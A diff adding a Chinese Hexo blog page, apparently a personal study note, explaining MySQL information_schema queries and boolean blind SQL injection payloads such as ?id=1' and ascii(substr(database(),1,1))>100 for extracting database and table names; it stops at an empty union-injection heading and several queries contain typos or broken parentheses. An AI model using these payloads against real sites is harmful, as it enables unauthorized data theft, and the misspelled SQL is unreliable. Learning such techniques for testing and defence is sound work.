@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="John Doe">
+
+
+
+<meta name="description" content="前置知识//通过这条语句可以得到所有的数据库名selcet schema from information_schema.schemata limit 0,1 //通过这条语句可以得到所有的数据表名 select table_name from information_schema.table where table_name=’security’ //通过这条语句可以得到所有的列名 select">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入详解">
+<meta property="og:url" content="http://yoursite.com/2019/07/28/sql注入详解/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前置知识//通过这条语句可以得到所有的数据库名selcet schema from information_schema.schemata limit 0,1 //通过这条语句可以得到所有的数据表名 select table_name from information_schema.table where table_name=’security’ //通过这条语句可以得到所有的列名 select">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-07-28T01:19:45.639Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入详解">
+<meta name="twitter:description" content="前置知识//通过这条语句可以得到所有的数据库名selcet schema from information_schema.schemata limit 0,1 //通过这条语句可以得到所有的数据表名 select table_name from information_schema.table where table_name=’security’ //通过这条语句可以得到所有的列名 select">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>sql注入详解 | Hexo</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: 
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">John Doe</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="/2509629658@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="/hzfsummer.github.io" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于web安全</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">John Doe</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">John Doe</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="/2509629658@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="/hzfsummer.github.io" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-sql注入详解" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/07/28/sql注入详解/" class="article-date">
+      <time datetime="2019-07-28T01:15:49.000Z" itemprop="datePublished">2019-07-28</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql注入详解
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>//通过这条语句可以得到所有的数据库名<br>selcet schema from information_schema.schemata limit 0,1</p>
+<p>//通过这条语句可以得到所有的数据表名</p>
+<p>select table_name from information_schema.table where table_name=’security’</p>
+<p>//通过这条语句可以得到所有的列名</p>
+<p>select column_name from information_schema.column limit 0,1</p>
+<p>//通过这条语句可以得到指定数据库security中的数据表Users的所有列名</p>
+<p>select coulmn_name from information_schema.column where table_schema =’security’ and<br>table_name=’users’ limit 0,1</p>
+<p>//mysql中比较常用的一些函数</p>
+<p> version(): 查询数据库的版本</p>
+<p> user():查询数据库的使用者</p>
+<p> database():数据库</p>
+<p> system_user():系统用户名</p>
+<p> session_user():连接数据库的用户名</p>
+<p> curren_user:当前用户名</p>
+<p> load_file():读取本地文件</p>
+<p> @@datadir: 读取数据库路径</p>
+<p> @@version_complie_os:查看操作系统</p>
+<p> @@basedir:mysql安装路径</p>
+<p> ascii(str):返回给定字符的ascii值，如果str是空字符串，返回0；如果str是NUll,返回NULL</p>
+<p> length():返回给定字符串的长度</p>
+<p> substr(string,start,length):对于给定字符串string,从start位开始截取，截取length长度</p>
+<p> substr()\stbstring()\mid()三个函数的用法一致</p>
+<p> concat(username):将查询到的username连在一起，默认用逗号分隔</p>
+<p> concat(str1,”*”,str2):将字符串str1和str2的数据查询在一起，中间用*连接</p>
+<p> group_concat(username):将username数据查询在一起，用逗号连接</p>
+<p> limit n,1:查询第n+1个数</p>
+<h1 id="判断是否存在sql注入"><a href="#判断是否存在sql注入" class="headerlink" title="判断是否存在sql注入"></a>判断是否存在sql注入</h1><p> 工具查询</p>
+<p> 手工查询：二话不说，先加单引号，双引号，单双括号看看是否报错</p>
+<p> and 1=1 and 1=2 是否显示并不一样<br> 一。。。。。。。。。。。布尔盲注<br> 盲注一般用到的函数有：</p>
+<p> ascii(),substr(),length(),exsits(),concat()<br> 1:判断数据库类型</p>
+<p> mysql特有的表是information_schema.tables,</p>
+<p> access数据库特有的表是msyobjects,sqlserver特有的表sysobjects.接下来，我们可以用以下的语句判断数据库。<br> //判断是否是mysql数据库</p>
+<p> ?id=1’ and exists(select*from information_schema.tables)#</p>
+<p> 同理判断其他 修改特殊表的表名</p>
+<p> 下面对常用字段进行介绍</p>
+<p> table_schema:记录数据库名</p>
+<p> table_name:记录表名</p>
+<p> table_rows:关于表的粗略行估计</p>
+<p> data length:记录表的大小（单位字节）</p>
+<h1 id="2：判断当前数据库名（以下方法不适用acess和sql-server"><a href="#2：判断当前数据库名（以下方法不适用acess和sql-server" class="headerlink" title="2：判断当前数据库名（以下方法不适用acess和sql server)"></a>2：判断当前数据库名（以下方法不适用acess和sql server)</h1><p> —1:判断当前数据库的长度，利用二分法</p>
+<p> ?id=1’and length(database())&gt;5 //正常显示</p>
+<p> ?id=1’and length(database())&gt;10//不显示任何数据</p>
+<blockquote>
+<p>7 //正常显示  &gt;8不显示任何数据<br> 故数据库长度位8<br> –2：判断数据库的第一个字符<br> ?id=1’ and ascii(substr(database()),1,1))&gt;100<br> //第二个字符<br> ?id=1’ and ascii(substr(database()),2,1))&gt;100<br> 。。。。。。。。。。。。。</p>
+</blockquote>
+<h1 id="3-判断数据库中的表"><a href="#3-判断数据库中的表" class="headerlink" title="3:判断数据库中的表"></a>3:判断数据库中的表</h1><h3 id="判断当前数据库中表的个数"><a href="#判断当前数据库中表的个数" class="headerlink" title="判断当前数据库中表的个数"></a>判断当前数据库中表的个数</h3><p> //判断当前数据库中表的个数是否大于5，用二分法依次判断，</p>
+<blockquote>
+<p>id’ and (selct count(table_name)  from information_schema.table where table_schema=database())&gt;5</p>
+</blockquote>
+<h3 id="判断每个表的长度"><a href="#判断每个表的长度" class="headerlink" title="判断每个表的长度"></a>判断每个表的长度</h3><p> id=1’ and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6</p>
+<p> 判断第二个表的长度</p>
+<p>  id=1’ and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6</p>
+<h3 id="判断每个表的每个字符的ascii值"><a href="#判断每个表的每个字符的ascii值" class="headerlink" title="判断每个表的每个字符的ascii值"></a>判断每个表的每个字符的ascii值</h3><p>  ?id=1’ and ascii(substr((select table_name from information_schema.tables where table_name=database() limit(0,1),1,1))&gt;100</p>
+<p>  第二个字符</p>
+<p>  ?id=1’ and ascii(substr((select table_name from information_schema.tables where table_name=database() limit(0,1),2,1))&gt;100</p>
+<p>  4.判断表中的字段<br>  pass::</p>
+<h1 id="二：union注入"><a href="#二：union注入" class="headerlink" title="二：union注入"></a>二：union注入</h1>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/07/28/sql注入详解/">sql注入详解</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">John Doe</a></p>
+        <p><span>发布时间:</span>2019-07-28, 09:15:49</p>
+        <p><span>最后更新:</span>2019-07-28, 09:19:45</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/07/28/sql注入详解/" title="sql注入详解">http://yoursite.com/2019/07/28/sql注入详解/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/07/28/sql注入详解/　　作者: John Doe" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/07/28/php常见漏洞-ctf/">
+                    php常见漏洞-ctf
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前置知识"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#判断是否存在sql注入"><span class="toc-number">2.</span> <span class="toc-text">判断是否存在sql注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2：判断当前数据库名（以下方法不适用acess和sql-server"><span class="toc-number">3.</span> <span class="toc-text">2：判断当前数据库名（以下方法不适用acess和sql server)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-判断数据库中的表"><span class="toc-number">4.</span> <span class="toc-text">3:判断数据库中的表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#判断当前数据库中表的个数"><span class="toc-number">4.0.1.</span> <span class="toc-text">判断当前数据库中表的个数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断每个表的长度"><span class="toc-number">4.0.2.</span> <span class="toc-text">判断每个表的长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#判断每个表的每个字符的ascii值"><span class="toc-number">4.0.3.</span> <span class="toc-text">判断每个表的每个字符的ascii值</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二：union注入"><span class="toc-number">5.</span> <span class="toc-text">二：union注入</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"sql注入详解　| Hexo　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section class="youyan" id="comments">
+    <script>
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=';
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+    <div id="uyan_frame"></div>
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/07/28/php常见漏洞-ctf/" title="下一篇: php常见漏洞-ctf">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/07/28/sql注入详解/">sql注入详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/28/php常见漏洞-ctf/">php常见漏洞-ctf</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019 John Doe
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
